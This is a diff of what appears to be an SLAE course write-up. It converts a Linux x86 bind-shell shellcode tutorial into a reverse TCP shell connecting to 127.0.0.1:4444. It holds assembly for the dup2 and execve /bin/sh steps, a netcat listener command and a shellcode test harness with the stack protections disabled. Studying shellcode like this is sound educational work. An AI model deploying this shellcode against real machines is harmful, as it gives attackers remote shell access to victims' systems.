@@ -270,7 +270,7 @@ The word value of 0x2 is pushed onto the stack which loads the value for AF_INET
 
 The ESP stack pointer (top of the stack) is moved into the ECX register to store the const struct sockaddr *addr argument. 
 
-The value of 16 (struct sockaddr) is pushed onto the stack, along with the zeros which equate to the IP address:
+The value of 16 (struct sockaddr) is then pushed onto the stack, along with the pointers to sockaddr pushed onto the stack:
 
 ```nasm
 	mov edi, 0xffffffff; XOR IP address with this hex value (avoid NULL's contained in IP)
@@ -320,134 +320,10 @@ Followed by an instruction to call the interrupt to execute the bind syscall:
         int 0x80        ; call the interrupt to execute the connect syscall
 ```
 
-#### 3rd Syscall (Listen for incoming connections)
-----
-
-The listen syscall works by preparing the bind socket to listen for incoming connections. 
-
-The man pages defines the arguments required for the listen syscall:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ man listen
-
-LISTEN(2)                              Linux Programmer's Manual                             LISTEN(2)
-
-NAME
-       listen - listen for connections on a socket
-
-SYNOPSIS
-       #include <sys/types.h>          /* See NOTES */
-       #include <sys/socket.h>
-
-       int listen(int sockfd, int backlog);
-
-DESCRIPTION
-       listen()  marks the socket referred to by sockfd as a passive socket, that is, as a socket that
-       will be used to accept incoming connection requests using accept(2).
-
-       The sockfd argument is a file descriptor that  refers  to  a  socket  of  type  SOCK_STREAM  or
-       SOCK_SEQPACKET.
-
-       The  backlog  argument defines the maximum length to which the queue of pending connections for
-       sockfd may grow.  If a connection request arrives when  the  queue  is  full,  the  client  may
-       receive  an  error  with  an indication of ECONNREFUSED or, if the underlying protocol supports
-       retransmission, the request may be ignored so that a later reattempt at connection succeeds.
-```
-
-A byte of 1 is pushed onto the stack to listen for 1 client at a time, the socket value is moved into the lower memory portion of EAX.
-
-The listen syscall is executed using the code of 4, the program interrupt is called to execute the listen syscall.
-
-3rd syscall (Assembly code section):
-
-```nasm
-        ; 3rd syscall - listen for incoming connections
-        push byte 0x1   ; listen for 1 client at a time
-        push edx        ; pointer to stack
-        mov al, 0x66    ; socketcall
-        mov bl, 0x4     ; sys_listen = 4
-        mov ecx, esp    ; pointer to the arguments pushed
-        int 0x80        ; call the interrupt to execute the listen syscall
-```
-
-#### 4th Syscall (Accept incoming connections)
-----
-
-The accept syscall is defined by the man pages as follows:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ man accept
-
-ACCEPT(2)                              Linux Programmer's Manual                             ACCEPT(2)
-
-NAME
-       accept - accept a connection on a socket
-
-SYNOPSIS
-       #include <sys/types.h>          /* See NOTES */
-       #include <sys/socket.h>
-
-       int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-
-       #define _GNU_SOURCE             /* See feature_test_macros(7) */
-       #include <sys/socket.h>
-
-       int accept4(int sockfd, struct sockaddr *addr,
-                   socklen_t *addrlen, int flags);
-
-DESCRIPTION
-       The  accept()  system  call  is used with connection-based socket types (SOCK_STREAM, SOCK_SEQ-
-       PACKET).  It extracts the first connection request on the queue of pending connections for  the
-       listening  socket,  sockfd,  creates  a new connected socket, and returns a new file descriptor
-       referring to that socket.  The newly created socket is not in the listening state.  The  origi-
-       nal socket sockfd is unaffected by this call.
-```
-
-The next 3 arguments can all equal '0' according to the man pages definition of the accept syscall.
-
-The 4 arguments required for accept4:
-
-* sockfd -> EDX (reference of socket initially stored in EAX)
-* addr -> ESI == 0
-* addrlen -> ESI == 0
-* flags -> ESI == 0
-
-The socket value (stored in EDX) is pushed onto the stack: 
-
-```nasm
-        push esi        ; NULL
-        push esi        ; NULL
-        push edx        ; pointer to sockfd
-```
-
-The RETURN VALUE defined in the man pages for accept4 describes a new sockfd value returned after the accept syscall is executed.
-
-The accept syscall is executed using the code of 5, the program interrupt is then called which executes the accept syscall:
-
-```nasm
-	mov al, 0x66    ; socketcall
-        mov bl, 5       ; sys_accept = 5
-        mov ecx, esp    ; pointer to arguments pushed
-        int 0x80        ; call the interrupt to execute accept syscall
-```
-
-4th syscall (Assembly code section):
-
-```nasm
-	; 4th syscall - accept incoming connections
-        push esi        ; NULL
-        push esi        ; NULL
-        push edx        ; pointer to sockfd
-        mov al, 0x66    ; socketcall
-        mov bl, 5       ; sys_accept = 5
-        mov ecx, esp    ; pointer to arguments pushed
-        int 0x80        ; call the interrupt to execute accept syscall
-```
-
-#### 5th Syscall (Duplicate File Descriptors for STDIN, STDOUT and STDERR)
+#### 3rd Syscall (Duplicate File Descriptors for STDIN, STDOUT and STDERR)
 ------
 
-The dup2 syscall works by creating a loop, and iterating 3 times to accomodate all 3 file descriptors loading into the accepted connection (providing an interactive bind shell session).
+The dup2 syscall works by creating a loop, and iterating 3 times to accomodate all 3 file descriptors loading into the accepted connection (providing an interactive reverse shell session).
 
 To redirect IO to the descriptor, a loop is initiated with the ECX register, commonly known as the counter register. 
 
@@ -458,7 +334,7 @@ osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.
 #define __NR_dup2 63
 ```
 
-All required arguments of dup2 are in sockfd (stored in accept syscall), which will be moved into EBX.
+All required arguments of dup2 are in sockfd (stored in connect syscall), which will be moved into EBX.
 
 The syscall code of 0x3f is moved in the lower part of the EAX memory region.
 
@@ -467,8 +343,7 @@ Whilst the signed flag is not set (JNS) - the counter register is decremented ea
 5th syscall (Assembly code section):
 
 ```nasm
-	; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
-        mov edx, eax    ; save client file descriptor
+	; 3rd syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
 	xor ecx, ecx	; clear ecx register
 	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
 	mov ebx, edx	; move socket into ebx (new int sockfd)
@@ -480,7 +355,7 @@ Whilst the signed flag is not set (JNS) - the counter register is decremented ea
         jns loop_dup2   ; repeat for 1,0
 ```
 
-#### 6th Syscall (Execute /bin/sh using Execve) 
+#### 4th Syscall (Execute /bin/sh using Execve) 
 ------
 
 The final syscall instructs the program to execute the execve syscall which essentially points to '/bin/sh'. 
@@ -518,7 +393,7 @@ DESCRIPTION
            int main(int argc, char *argv[], char *envp[])
 ```
 
-This objective is achieved when a connection is made to the newly created bind port, in turn excuting an interactive shell for an attacker on the target machine.
+This objective is achieved when a connection is made to the newly created socket port, in turn excuting an interactive shell for an attacker on the target machine.
 
 This instuction set will load the string '/bin/sh' onto the stack in reverse order, since the stack grows from high to low memory.
 
@@ -585,7 +460,7 @@ osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.
 
 The value of 0xb is placed into the lower memory region of EAX.
 
-Finally, the execve syscall and the program interrupt are called to execute the program, and initiate the full TCP bind shell on the target machine:
+Finally, the execve syscall and the program interrupt are called to execute the program, and initiate the full Reverse TCP shell on the target machine:
 
 ```nasm
 	mov al, 0xb     ; move syscall code for execve into al
@@ -595,7 +470,7 @@ Finally, the execve syscall and the program interrupt are called to execute the 
 6th syscall (Assembly code section):
 
 ```nasm
-	; 6th syscall - execute /bin/sh using execve
+	; 4th syscall - execute /bin/sh using execve
         xor eax, eax	; clear eax register
 	push eax        ; terminator placed onto the stack with value of 0
         push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
@@ -615,7 +490,7 @@ Finally, the execve syscall and the program interrupt are called to execute the 
 ````nasm
 ; Filename: reverse_shell_tcp.nasm
 ; Author: h3ll0clar1c3
-; Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444, spawn a shell on incoming connection
+; Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444
 ; Compilation: ./compile.sh reverse_shell_tcp
 ; Usage: ./reverse_shell_tcp
 ; Testing: nc -lv 4444
@@ -660,25 +535,7 @@ section .text
         ;inc ebx         ; sys_connect = 3
         int 0x80        ; call the interrupt to execute the connect syscall
 
-        ; 3rd syscall - listen for incoming connections
-        push byte 0x1   ; listen for 1 client at a time
-        push edx        ; pointer to stack
-        mov al, 0x66    ; socketcall
-        mov bl, 0x4     ; sys_listen = 4
-        mov ecx, esp    ; pointer to the arguments pushed
-        int 0x80        ; call the interrupt to execute the listen syscall
-
-        ; 4th syscall - accept incoming connections
-        push esi        ; NULL
-        push esi        ; NULL
-        push edx        ; pointer to sockfd
-        mov al, 0x66    ; socketcall
-        mov bl, 5       ; sys_accept = 5
-        mov ecx, esp    ; pointer to arguments pushed
-        int 0x80        ; call the interrupt to execute accept syscall
-
-        ; 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
-        mov edx, eax    ; save client file descriptor
+        ; 3rd syscall - duplicate file descriptors for STDIN, STDOUT and STDERR
 	xor ecx, ecx	; clear ecx register
 	mov cl, 3	; counter for file descriptors 0,1,2 (STDIN, STDOUT, STDERR)
 	mov ebx, edx	; move socket into ebx (new int sockfd)
@@ -689,7 +546,7 @@ section .text
         int 0x80      	; call interrupt to execute dup2 syscall
         jns loop_dup2   ; repeat for 1,0
 
-        ; 6th syscall - execute /bin/sh using execve
+        ; 4th syscall - execute /bin/sh using execve
         xor eax, eax	; clear eax register
 	push eax        ; terminator placed onto the stack with value of 0
         push 0x68732f6e ; push the end of "//bin/sh", 'hs/n'
@@ -839,11 +696,11 @@ A simple C program scripted and edited with the newly generated shellcode:
 /**
 * Filename: shellcode.c
 * Author: h3ll0clar1c3
-* Purpose: Bind shellcode on TCP port 5555, spawn a shell on incoming connection  
+* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 4444 
 * Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shell_bind_tcp_final  
-* Usage: ./shell_bind_tcp_final
-* Testing: nc -nv 127.0.0.1 5555
-* Shellcode size: 105 bytes
+* Usage: ./reverse_shell_tcp_final
+* Testing: nc -lv 4444
+* Shellcode size: ??? bytes
 * Architecture: x86
 **/
 
